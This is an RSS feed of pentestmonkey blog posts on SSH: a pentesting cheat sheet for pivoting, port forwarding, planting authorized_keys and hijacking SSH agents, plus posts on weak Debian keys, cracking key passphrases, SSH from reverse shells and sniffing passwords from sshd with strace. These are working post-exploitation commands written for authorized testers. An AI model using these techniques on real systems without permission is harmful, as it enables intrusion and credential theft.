<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>ssh &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/ssh/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Tue, 30 Aug 2011 08:14:31 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>SSH Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 28 Aug 2011 16:00:06 +0000</pubDate>
				<category><![CDATA[Cheat Sheets]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ssh]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=194</guid>

					<description><![CDATA[SSH has several features that are useful during pentesting and auditing.  This page aims to remind us of the syntax for the most useful features. NB: This page does not attempt to replace the man page for pentesters, only to supplement it with some pertinent examples. SOCKS Proxy Set up a SOCKS proxy on 127.0.0.1:1080 that lets [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>SSH has several features that are useful during pentesting and auditing.  This page aims to remind us of the syntax for the most useful features.</p>
<p>NB: This page does not attempt to replace the <a href="http://www.openssh.org/manual.html">man page</a> for pentesters, only to supplement it with some pertinent examples.</p>
<h2>SOCKS Proxy</h2>
<p>Set up a SOCKS proxy on 127.0.0.1:1080 that lets you pivot through the remote host (10.0.0.1):</p>
<p><strong>Command line:</strong></p>
<pre>ssh -D 127.0.0.1:1080 10.0.0.1</pre>
<p><strong>~/.ssh/config:</strong></p>
<pre>Host 10.0.0.1
DynamicForward 127.0.0.1:1080</pre>
<p><strong></strong>You can then use tsocks or similar to use non-SOCKS-aware tools on hosts accessible from 10.0.0.1:</p>
<pre>tsocks rdesktop 10.0.0.2</pre>
<h2>Local Forwarding</h2>
<p>Make services on the remote network accessible to your host via a local listener.</p>
<p>NB: Remember that you need to be root to bind to TCP port &lt;1024.  Higher ports are used in the examples below.</p>
<h3>Example 1</h3>
<p>The service running on the remote host on TCP port 1521 is accessible by connecting to 10521 on the SSH client system.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -L 127.0.0.1:10521:127.0.0.1:1521 user@10.0.0.1</pre>
<p><strong>~/.ssh/config:</strong></p>
<pre>LocalForward 127.0.0.1:10521 127.0.0.1:1521</pre>
<h3>Example 2</h3>
<p>Same thing, but other hosts on the same network as the SSH client can also connect to the remote service (can be insecure).</p>
<p><strong>Command line:</strong></p>
<pre>ssh -L 0.0.0.0:10521:127.0.0.1:1521 10.0.0.1</pre>
<p><strong>~/.ssh/config:</strong></p>
<pre>LocalForward 0.0.0.0:10521 127.0.0.1:1521</pre>
<h3>Example 3</h3>
<p>In this example, 10.0.0.99 is a host that&#8217;s accessible from the SSH server.  We can access the service it&#8217;s running on TCP port 1521 by connecting to 10521 on the SSH client.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -L 127.0.0.1:10521:10.0.0.99:1521 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>LocalForward 127.0.0.1:10521 10.0.0.99:1521</pre>
<h2>Remote Forwarding</h2>
<p>Make services on your local system / local network accessible to the remote host via a remote listener.  This sounds like an odd thing to want to do, but perhaps you want to expose a services that lets you download your tools.</p>
<p>NB: Remember that you need to be root to bind to TCP port &lt;1024.  Higher ports are used in the examples below.</p>
<h3>Example 1</h3>
<p>The SSH server will be able to access TCP port 80 on the SSH client by connecting to 127.0.0.1:8000 on the SSH server.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -R 127.0.0.1:8000:127.0.0.1:80 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>RemoteForward 127.0.0.1:8000 127.0.0.1:80</pre>
<h3>Example 2</h3>
<p>The SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the SSH client) by connecting to 127.0.0.1:8000 on the SSH server.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -R 127.0.0.1:8000:172.16.0.99:80 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>RemoteForward 127.0.0.1:8000 172.16.0.99:80</pre>
<h3>Example 3</h3>
<p>The SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the SSH client) by connecting to TCP port 8000 on the SSH server.  Any other hosts able to connect to TCP port 8000 on the SSH server will also be able to access 172.16.0.99:80.  This can sometimes be insecure.</p>
<p><strong>Command line:</strong></p>
<pre>ssh -R 0.0.0.0:8000:172.16.0.99:80 10.0.0.1</pre>
<p><strong></strong><strong>~/.ssh/config:</strong></p>
<pre>RemoteForward 0.0.0.0:8000 172.16.0.99:80</pre>
<h2>Configuration Files</h2>
<h3>~/.ssh/config</h3>
<p>It&#8217;s sometimes easier to configure options on your SSH client system in ~/.ssh/config for hosts you use a lot rather than having to type out long command lines.</p>
<p>Using ~/.ssh/config also makes it easier to use other tools that use SSH (e.g. scp and rsync).  It&#8217;s possible to tell other tools that SSH listens on a different port, but it&#8217;s a pain.</p>
<pre>Host 10.0.0.1
Port 2222
User ptm
ForwardX11 yes
DynamicForward 127.0.0.1:1080
RemoteForward 80 127.0.0.1:8000
LocalForward 1521 10.0.0.99:1521</pre>
<p>The above lines are explained more fully in the other subsection on this page.</p>
<h3>~/.ssh/authozied_keys</h3>
<p>During a pentest or audit, you might want to add an authorized_keys file to let you log in using an SSH key.</p>
<p>The authorized_keys file lives in a user&#8217;s home directory on the SSH server.  It holds the public keys of the users allowed to log into that user&#8217;s account.</p>
<p>Generate a public/private key pair like this:</p>
<pre>ssh-keygen -f mykey
cat mykey.pub # you can copy this to authorized_keys</pre>
<p>If you want to shortest possible key (because your arbitrary-file-write vector is limited), do this:</p>
<pre>ssh-keygen -f mykey -t rsa -b 768
cat mykey.pub # copy to authorized_key.  Omit the trailing user@host if you need a shorter key.</pre>
<p>Connect to the target system like this (you need to know the username of the user you added an authorized key for):</p>
<pre>ssh -i mykey user@10.0.0.1</pre>
<p>Caveat: The authorized_keys file might not work if it&#8217;s writable by other users.  If you already have shell access you can &#8220;chmod 600 ~/.ssh/authorized_keys&#8221;.  However, if you&#8217;re remotely exploiting an arbitrary file-write vulnerability and happen to have a weak umask, you may have problems.</p>
<h2>X11 Forwarding</h2>
<p>If your SSH client is also an X-Server then you can launch X-clients (e.g. Firefox) inside your SSH session and display them on your X-Server.  This works well with from Linux X-Servers and from <a href="http://www.cygwin.com/">cygwin</a>&#8216;s X-server on Windows.</p>
<h3>Command Line:</h3>
<pre>SSH -X 10.0.0.1
SSH -Y 10.0.0.1 # less secure alternative - but faster</pre>
<h3>~/.ssh/config:</h3>
<pre>ForwardX11 yes
ForwardX11Trusted yes # less secure alternative - but faster</pre>
<h2>SSH Agents</h2>
<p>SSH agents can be used to hold your private SSH keys in memory.  The agent will then authenticate you to any hosts that trust your SSH key.</p>
<p>This has the following advantages:</p>
<ul>
<li>You don&#8217;t have to keep entering your passphrase (if you chose to encrypt your private key)</li>
<li>But you still get to store your private SSH key in an encrypted format on disk.</li>
</ul>
<p>Using an SSH agent is probably more secure than storing your key in cleartext, but agents can be hijacked.</p>
<h3>Using an SSH Agent</h3>
<p>First start your agent:</p>
<pre>eval `ssh-agent`</pre>
<p>Then add your keys to it &#8211; you&#8217;ll need to enter your passphrase for any encrypted keys:</p>
<pre>ssh-add ~/dir/mykey</pre>
<h3>Hijacking SSH Agents</h3>
<p>If you see SSH agents running on a pentest (process called &#8220;ssh-agent&#8221;), you might be able to use it to authenticate you to other hosts &#8211; or other accounts on that host.  Check out ~/.ssh/known_hosts for some ideas of where you might be able to connect to.</p>
<p>You can use any agents running under the account you compromised.  If you&#8217;re root you can use any SSH agent.</p>
<p>SSH agents listen on a unix socket.  You need to figure where this is for each agent (e.g. /tmp/ssh-tqiEl28473/agent.28473). You can then use the agent like this:</p>
<pre>export  SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473
ssh-add -l # lists the keys loaded into the agent
ssh user@host # will authenticate you if server trusts key in agent</pre>
<p>This command illustrates how you could inspect the environment of every ssh-agent process on a Linux system.  It should yield a list of unix sockets for SSH agents.</p>
<pre>ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '</pre>
<h3>Agent Forwarding</h3>
<p>If you enable SSH agent forwarding then you&#8217;ll be able to carry on using the SSH agent on your SSH client during your session on the SSH server.  This is potentially insecure because so will anyone else who is root on the SSH server you&#8217;re connected to.  Avoid using this feature with any keys you care about.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Metasploit Release Database of Weak SSH Keys for Debian OpenSSL Vuln</title>
		<link>https://pentestmonkey.net/blog/metasploit-ssh-key-database</link>
					<comments>https://pentestmonkey.net/blog/metasploit-ssh-key-database#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 14 May 2008 22:53:43 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[metasploit]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ssh]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=55</guid>

					<description><![CDATA[The metasploit guys have released a database of all 1024-bit DSA and 2048-bit RSA SSH public/private keypairs that could have been generated by x86 Debian/Ubuntu hosts vulnerable to the OpenSSL Predictable Random Number Generator flaw. This opens up the possibility of two practical attacks against weak SSH keys during pentests: If you can read a [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>The metasploit guys have <a href="http://metasploit.com/users/hdm/tools/debian-openssl/">released</a> a database of all 1024-bit DSA and 2048-bit RSA SSH public/private keypairs that could have been generated by x86 Debian/Ubuntu hosts vulnerable to the <a href="http://www.debian.org/security/2008/dsa-1571">OpenSSL Predictable Random Number Generator</a> flaw.</p>
<p>This opens up the possibility of two practical attacks against weak SSH keys during pentests:</p>
<ol>
<li>If you can read a user&#8217;s home directory and obtain their ~/.ssh/authorized_keys file, you can look up their corresponding private key in the metaspoloit key database and log into their account over SSH.  Nice.</li>
<li>If you find an SSH server that uses a weak key for it&#8217;s host key (check if it&#8217;s weak using <a href="http://security.debian.org/project/extra/dowkd/dowkd.pl.gz">dowkd.pl</a>), you can look up the corresponding private SSH host key in the metasploit database, then perform a Man-in-the-Middle attack: when legitimate users attempt to log into the server, you ARP spoof them (or similar) so they&#8217;re actually talking to your SSH server.  Your SSH server authenticates itself to the user with the legit server&#8217;s private SSH key.  The user believes you&#8217;re the legit server and sends their username and password to you over the encrypted channel*.</li>
</ol>
<p>Well done to the metasploit guys for the quick turn-around.  And also well done the Debian guys for the open and efficient way they&#8217;ve dealt with this vulnerability.</p>
<p>* Probably only works if tunneled clear-text password are used.  I haven&#8217;t completely through this through, but I&#8217;m sure you can do something pretty bad.</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/metasploit-ssh-key-database/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Tool for Cracking Passphrases on Encrypted SSH Keys</title>
		<link>https://pentestmonkey.net/blog/phrasendrescher</link>
					<comments>https://pentestmonkey.net/blog/phrasendrescher#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 05 Apr 2008 19:50:02 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[phrasendrescher]]></category>
		<category><![CDATA[ssh]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=44</guid>

					<description><![CDATA[Phrasen&#124;drescher is a tool for those pentests when you&#8217;re having trouble owning those last few *nix boxes.  It was released in 2007 but I hadn&#8217;t had cause to try it out until recently. If you&#8217;ve already gained access to a few *nix boxes, but can&#8217;t get into the rest you&#8217;ll naturally start trying to enumerate [&#8230;]]]></description>
										<content:encoded><![CDATA[<p><a href="http://leidecker.info/projects/phrasendrescher.shtml">Phrasen|drescher</a> is a tool for those pentests when you&#8217;re having trouble owning those last few *nix boxes.  It was released in 2007 but I hadn&#8217;t had cause to try it out until recently.</p>
<p>If you&#8217;ve already gained access to a few *nix boxes, but can&#8217;t get into the rest you&#8217;ll naturally start trying to enumerate the trusts between the hosts.  Trusts could be configured for the Berkley R-Services (i.e. .rhosts, hosts.equiv) or they could be SSH host-based trusts, shared passwords or trusts based on the unencrypted SSH keys left in user&#8217;s home directories.</p>
<p>If you&#8217;re really unlucky the users may have actually encrypted their SSH keys with a passphrase.  This is the problem that Nico Leidecker&#8217;s <a href="http://leidecker.info/projects/phrasendrescher.shtml">Phrasen|drescher</a> addresses.</p>
<p>It can run at around 17 000 guesses per second (on my ~2GHz PC at least).  It supports  dictionary-based guessing, permutations of dictionary words (e.g. l33t) and pure brute force.  I&#8217;d include an example of it running, but the documentation on the home page is pretty good too, so you may as well <a href="http://leidecker.info/projects/phrasendrescher.shtml">read that instead</a> .</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/phrasendrescher/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Using SSH Without A TTY</title>
		<link>https://pentestmonkey.net/blog/ssh-with-no-tty</link>
					<comments>https://pentestmonkey.net/blog/ssh-with-no-tty#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 15 Dec 2007 23:35:29 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ssh]]></category>
		<category><![CDATA[tty]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=29</guid>

					<description><![CDATA[I recently received a mail asking how to get SSH to work from within a reverse shell (see php-reverse-shell , php-findsock-shell and perl-reverse-shell ).  I thought I&#8217;d write a brief description of the problems I&#8217;ve seen and how to work round them. I&#8217;d be very interested if anyone has any better solutions.  Drop me a [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I recently received a mail asking how to get SSH to work from within a reverse shell (see <a href="http://pentestmonkey.net/tools/php-reverse-shell/">php-reverse-shell</a> , <a href="http://pentestmonkey.net/tools/php-findsock-shell/">php-findsock-shell </a> and <a href="http://pentestmonkey.net/tools/perl-reverse-shell/">perl-reverse-shell</a> ).  I thought I&#8217;d write a brief description of the problems I&#8217;ve seen and how to work round them.</p>
<p>I&#8217;d be very interested if anyone has any better solutions.  Drop me a mail (pentestmonkey at pentestmonkey dot net).</p>
<p>Update: Also see this <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty/">follow-up post</a> on a similar subject.</p>
<p><span id="more-29"></span></p>
<h3>Problem 1: &#8220;Host key verification failed.&#8221;</h3>
<p>When you connect to a host for the first time you normally (when you ave a TTY) get a message like:</p>
<pre>$ ssh localhost</pre>
<pre>The authenticity of host 'localhost (127.0.0.1)' can't be established.</pre>
<pre>RSA key fingerprint is ...</pre>
<pre>Are you sure you want to continue connecting (yes/no)?</pre>
<p>You can answer &#8220;yes&#8221; and the authentication proceeds.</p>
<p>However, if you don&#8217;t have a TTY (like when you&#8217;re using a reverse shell), authentication fails immediately with an error:</p>
<pre>$ ssh localhost</pre>
<pre>Pseudo-terminal will not be allocated because stdin is not a terminal.</pre>
<pre>Host key verification failed.</pre>
<h3>Workaround</h3>
<p>Before attempting an SSH connection for the first time you need to grab the host keys for host you want to connect to and store them in the known_hosts file of the current user:</p>
<pre>ssh-keyscan -t rsa1,rsa,dsa localhost &gt;&gt; ~/.ssh/known_hosts</pre>
<p>Next time you try an SSH connection you won&#8217;t get the &#8220;Host key verification failed&#8221; error.</p>
<h3>Problem 2: Can&#8217;t enter SSH password</h3>
<p>If you don&#8217;t have a TTY (you typically don&#8217;t when using a reverse shell) you won&#8217;t be asked for a password, authentication will just fail:</p>
<pre>sh-3.2$ ssh localhost</pre>
<pre>Pseudo-terminal will not be allocated because stdin is not a terminal.</pre>
<pre>Permission denied (publickey,keyboard-interactive).</pre>
<h3>Workaround</h3>
<p>You can use an external program to provide the password you want to use. Check out:</p>
<ul>
<li><a class="moz-txt-link-freetext" href="http://www.splode.com/%7Efriedman/software/scripts/src/ssh-pass">http://www.splode.com/~friedman/software/scripts/src/ssh-pass</a></li>
<li>man ssh (search for &#8220;SSH_ASKPASS&#8221;)</li>
</ul>
<pre>$ cat /tmp/returnpassword.sh
#!/bin/sh
echo 'some password' &lt;/dev/null
$ export DISPLAY=:0
$ export SSH_ASKPASS=/tmp/returnpassword.sh
$ ssh user@host
id
uid=1000(user) gid=1000(user)
bash -i
user@host $</pre>
<h3>Other potential solutions</h3>
<p>Modify your php-reverse-shell (or whatever) to use PTYs if the PHP installation supports them.  Of course your php code will also need to handle the case when PTYs aren&#8217;t supported.  PHP 5 can support PTYs, but it needs to be compiled with the right options (&#8211;enable-pty).  The code modification should be simple:</p>
<pre>$descriptorspec = array(
   0 =&gt; array("pty"),  // stdin   
   1 =&gt; array("pty"),  // stdout
   2 =&gt; array("pty")   // stderr
);</pre>
<p>The system I tested the above code on gave the following error because PHP5 didn&#8217;t have PTY support enabled:</p>
<pre>Warning: proc_open() [function.proc-open]: pty pseudo terminal not supported on this system in ...htdocs/php-reverse-shell.php on line 109</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/ssh-with-no-tty/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Stealing Usernames and Passwords from SSHD</title>
		<link>https://pentestmonkey.net/blog/sshd-snooping</link>
					<comments>https://pentestmonkey.net/blog/sshd-snooping#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 24 Jun 2007 22:13:14 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[ssh]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=16</guid>

					<description><![CDATA[I just read a really cool blog post by Sebastian Krahmer. He discusses a post-exploitation technique to snoop on incomming SSH sessions &#8211; including the username and password used to authenticate. Sabastian discusses OpenSSH running with the &#8220;Privilege Separation&#8221; option turned on (the default). In this mode several sshd processes are created when an incomming [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I just read a really cool <a href="http://c-skills.blogspot.com/2007/06/note-on-privilege-separation.html">blog post</a> by Sebastian Krahmer. He discusses a post-exploitation technique to snoop on incomming SSH sessions &#8211; including the username and password used to authenticate.</p>
<p><span id="more-16"></span></p>
<p>Sabastian discusses OpenSSH running with the &#8220;Privilege Separation&#8221; option turned on (the default).</p>
<p>In this mode several sshd processes are created when an incomming connection is made.  The lower-privileged process needs to send the supplied username and password to the higher-privilged process in order for it to be verified.  It is during this inter-process communication where the snooping occurs.</p>
<p>The proof-of-concept code attaches to the sshd process, waits for it fork, then traps system calls within the child process.  When the child uses the &#8220;read&#8221; and &#8220;write&#8221; system calls to commicate with the parent process, the password is revealed.  Screenshots are included in the orginal <a href="http://c-skills.blogspot.com/2007/06/note-on-privilege-separation.html">post</a>.</p>
<p>We can recreate the process using a locally configured ssh daemon, an ssh client and the strace program to trap system calls.</p>
<p>First we connect to the ssh daemon.  This causes it to fork:</p>
<pre>$ ssh pm@localhost</pre>
<p>Wait for &#8220;password:&#8221; prompt, then in another session look for the sshd [priv] process.</p>
<pre># ps aux | grep ssh
root      7015  0.0  0.0  23720   456 ?        Ss   Apr16   0:00 /usr/sbin/sshd
pm       27870  0.0  0.0  22584  2056 pts/5    S+   19:44   0:00 ssh localhost
root     27871  0.1  0.0  33476  2172 ?        Ss   19:44   0:00 sshd: pm [priv]
sshd     27872  0.0  0.0  25060   888 ?        S    19:44   0:00 sshd: pm [net]
root     27873  0.0  0.0  33476   692 ?        S    19:44   0:00 sshd: pm [pam]</pre>
<p>Now strace it (you need to be root).  Then go back to the ssh client type in a password.  You&#8217;ll see your password being passed between sshd processes&#8230;</p>
<pre># strace -p 27871
Process 27871 attached - interrupt to quit
read(6, "???27", 4)                 = 4
read(6, "4???1???16verysecurepass", 23) = 23
write(4, "???236", 5)              = 5
write(4, "???16verysecurepass", 18) = 18
write(6, "????055", 5)              = 5
write(6, "???1", 4)                 = 4
read(6, "???1", 4)                  = 4</pre>
<p>The PoC automates this above process.  Very cool.</p>
<h3>What if Privilege Separation isn&#8217;t being used?</h3>
<p>If Privilege Separation is turned off the above technique doesn&#8217;t work because system calls aren&#8217;t used to send the unencrypted logon credentials.  It&#8217;s possible to see credentials being passed around via library calls using the ltrace tool, though.   The password sent in this example was lots of xxxxx&#8217;s:</p>
<pre># ps aux | grep sshd
 root      7640  0.0  0.0   5128   724 ?        Ss   19:46   0:00 /usr/sbin/sshd</pre>
<pre># sudo ltrace -f -p 7640
...
[pid 7658] HMAC_Update(0xbfff88d8, 0x80ae4d8, 128, 0x4222f7a0, 0x7a4e3342)           = 1
[pid 7658] HMAC_Final(0xbfff88d8, 0x80a1260, 0, 0x4222f7a0, 0x7a4e3342)              = 1
[pid 7658] HMAC_CTX_cleanup(0xbfff88d8, 0x80a1260, 0, 0x4222f7a0, 0x7a4e3342)        = 0xbfff88d8
[pid 7658] memcpy(0xbfff899b, "=", 1)                                                = 0xbfff899b
[pid 7658] free(0x80aa708)                                                           = &lt;void&gt;
[pid 7658] memcpy(0xbfffa984, "", 4)                                                 = 0xbfffa984
[pid 7658] calloc(1, 4)                                                              = 0x80aa708
[pid 7658] memcpy(0xbfffa954, "", 4)                                                 = 0xbfffa954
[pid 7658] malloc(34)                                                                = 0x80b4940
[pid 7658] memcpy(0x80b4940, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"..., 33)              = 0x80b4940
[pid 7658] malloc(4096)                                                              = 0x80b8440
[pid 7658] memcpy(0x80b8440, "", 4)                                                  = 0x80b8440
[pid 7658] memcpy(0x80b8444, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"..., 33)              = 0x80b8444
...</pre>
<h3>So what does it all mean?</h3>
<p>If you get root on a box during a pentest, you can snoop on processes.  No surprises or anything new here really.  However, I though it was really cool to see a practical and relatively safe way of automating such snooping &#8211; no trojaning of binaries, no risky patching of programs in memory.  Great post Sabastian.</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/sshd-snooping/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
